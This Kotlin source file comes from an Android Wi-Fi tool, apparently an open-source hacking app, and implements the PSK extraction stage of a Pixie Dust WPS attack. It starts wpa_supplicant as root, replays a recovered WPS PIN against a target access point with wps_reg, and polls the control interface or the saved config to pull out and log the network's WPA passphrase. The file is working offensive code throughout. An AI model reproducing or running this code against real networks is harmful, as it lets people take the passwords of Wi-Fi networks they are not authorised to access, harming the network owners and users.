/*
 * AmWF - Android WiFi Monitor Mode Controller
 * Copyright (C) 2026 Hitomatito
 *
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

package com.hitomatito.amwf.wifi.pixiedust

import android.content.Context
import com.hitomatito.amwf.ShellExecutor
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.delay
import kotlinx.coroutines.withTimeoutOrNull

/**
 * Obtiene el PSK WPA de la red tras conocer el PIN WPS.
 *
 * Reutiliza el mismo arranque de supplicant que el ataque
 * ([SupplicantProcesses.launch]) y hace la provisión WPS con el PIN hallado,
 * consultando después el PSK por la interfaz de control y, si no aparece, en
 * el config guardado.
 */
internal class PixiePskExtractor(
    private val context: Context,
    private val supplicant: SupplicantProcesses
) {

    suspend fun extract(
        bssid: String,
        iface: String,
        ssid: String,
        pin: String,
        rawOutput: StringBuilder,
        log: (String) -> Unit
    ): String? = withTimeoutOrNull(PSK_EXTRACT_TIMEOUT_MS) {
        // El hilo lector solo encola: la corrutina es la única que escribe en
        // el StringBuilder crudo y en la consola.
        var handle: SupplicantProcesses.Handle? = null
        try {
            log("[*] ===== WPA PSK EXTRACTION (WPS with PIN $pin) =====")
            supplicant.stop(null)

            // Mismo arranque que el ataque (ctrl dir, config, socket y PONG):
            // la fase sigue siendo EXTRACTING_PSK, así que launch no toca el
            // tracker.
            handle = supplicant.launch(iface = iface, rawOutput = rawOutput, log = log)
            if (handle == null) {
                log("[-] PSK stage: no se pudo arrancar wpa_supplicant para WPS")
                return@withTimeoutOrNull null
            }
            val supplicantLines = handle.lines

            fun cli(cmd: String): ShellExecutor.Result = supplicant.cli(iface, cmd)

            fun cliChecked(cmd: String): ShellExecutor.Result {
                val result = cli(cmd)
                if (result.exitCode != 0 ||
                    result.output.lineSequence().any { it.trim() == "FAIL" }
                ) {
                    val detail = result.output.ifBlank { "exit=${result.exitCode}" }
                    log("[-] wpa_cli '$cmd' failed: $detail")
                }
                return result
            }

            var netId = "0"
            val addRes = cliChecked("add_network")
            addRes.output.lines().firstOrNull { it.trim().toIntOrNull() != null }?.let { netId = it.trim() }
            log("[+] Network id = $netId")

            // El SSID viene del escaneo y puede contener comillas, `$()` o
            // backticks: se cita para que el shell de `su` lo trate como un
            // único argumento y no ejecute nada.
            val safeSsid = ssid.replace('\r', ' ').replace('\n', ' ')
            cliChecked("set_network $netId ssid ${PixieProcessSupport.shellQuote(safeSsid)}")
            cliChecked("set_network $netId key_mgmt WPA-PSK")

            // Sin `freq=`: wpa_cli 2.11 solo acepta BSSID y PIN (o los
            // seis argumentos de reconfiguración del AP). Tampoco se llama a
            // select_network: abortaría la sesión WPS recién iniciada.
            var regAccepted = false
            for (attempt in 1..2) {
                val regResult = cli("wps_reg $bssid $pin")
                val rejected = regResult.exitCode != 0 ||
                    regResult.output.lineSequence().any { it.trim() == "FAIL" }
                if (!rejected) {
                    regAccepted = true
                    break
                }
                val detail = regResult.output.ifBlank { "exit=${regResult.exitCode}" }
                log("[-] wps_reg rejected (attempt $attempt/2): $detail")
                if (attempt < 2) delay(1000)
            }
            if (!regAccepted) {
                log("[-] PSK stage: wps_reg was rejected; aborting PSK extraction")
                return@withTimeoutOrNull null
            }

            log("[*] Waiting for WPS provisioning & PSK (up to ${PSK_WAIT_MS / 1000}s)...")
            val deadline = System.currentTimeMillis() + PSK_WAIT_MS
            var psk: String? = null
            while (System.currentTimeMillis() < deadline) {
                supplicant.flushLines(supplicantLines, rawOutput, log)
                // wps_reg crea su propia red WPS con un id nuevo; no se puede
                // asumir que sea el de add_network. Se consultan todas las
                // redes conocidas y también el id devuelto por add_network.
                val ids = (listNetworkIds(::cli) + netId).distinct()
                val found = ids.asSequence()
                    .map { extractPskValue(cli("get_network $it psk")) }
                    .firstOrNull { !it.isNullOrEmpty() }
                if (found != null) {
                    psk = found
                    break
                }
                delay(1000)
            }

            if (psk == null) {
                log("[*] PSK not in control interface — trying save_config...")
                cli("save_config")
                psk = parsePskFromConfig()
            }

            if (psk != null) log("[+] WPA PSK: $psk") else log("[-] No PSK obtained from WPS exchange")
            return@withTimeoutOrNull psk
        } catch (e: CancellationException) {
            throw e
        } catch (e: Exception) {
            ShellExecutor.logE(TAG, "PSK extraction failed", e)
            log("[-] PSK extraction error: ${e.message}")
            return@withTimeoutOrNull null
        } finally {
            // Detiene el supplicant y vuelca la cola antes de que cleanup()
            // borre el ctrl dir: si no, se pierden las últimas líneas del PSK.
            supplicant.stopAndFlush(handle, rawOutput, log)
        }
    }

    /**
     * Extrae los ids de red de la salida de `wpa_cli list_networks`.
     * El formato es `id<TAB>ssid<TAB>bssid<TAB>flags`, con una cabecera que
     * empieza por "network id" y por tanto no se confunde con un id.
     */
    private fun listNetworkIds(cli: (String) -> ShellExecutor.Result): List<String> =
        cli("list_networks").output.lineSequence()
            .mapNotNull { line -> line.trim().takeWhile { it.isDigit() }.toIntOrNull()?.toString() }
            .distinct()
            .toList()

    private fun extractPskValue(result: ShellExecutor.Result): String? {
        if (result.exitCode != 0) return null
        val line = result.output.lines().firstOrNull { l ->
            val t = l.trim()
            t.isNotEmpty() && t != "OK" &&
                    !t.startsWith("Selected interface") &&
                    !t.startsWith("Using interface") &&
                    !t.contains("UNKNOWN COMMAND", ignoreCase = true) &&
                    !t.contains("FAIL", ignoreCase = true)
        } ?: return null
        return line?.trim()?.removePrefix("psk=")?.trim('"')?.trim()?.takeIf { it.isNotBlank() }
    }

    private fun parsePskFromConfig(): String? {
        // El config vive en el directorio de control, no en filesDir: se lee
        // a través de `su` porque la app no tiene acceso SELinux a esa ruta.
        val conf = NativeBinaries.runtimeConfigPath()
        val result = PixieProcessSupport.execSu("cat $conf 2>/dev/null", timeoutSeconds = 3)
        if (result.exitCode != 0) return null
        return result.output.lineSequence()
            .map { it.trim() }
            .filter { it.startsWith("psk=") }
            .map { it.removePrefix("psk=").trim('"').trim() }
            .firstOrNull { it.isNotBlank() }
    }

    companion object {
        private const val TAG = "PixiePskExtractor"

        /** Tiempo máximo de toda la fase de extracción de PSK. */
        private const val PSK_EXTRACT_TIMEOUT_MS = 45_000L

        /** Espera del PSK por la interfaz de control tras aceptar el wps_reg. */
        private const val PSK_WAIT_MS = 25_000L
    }
}
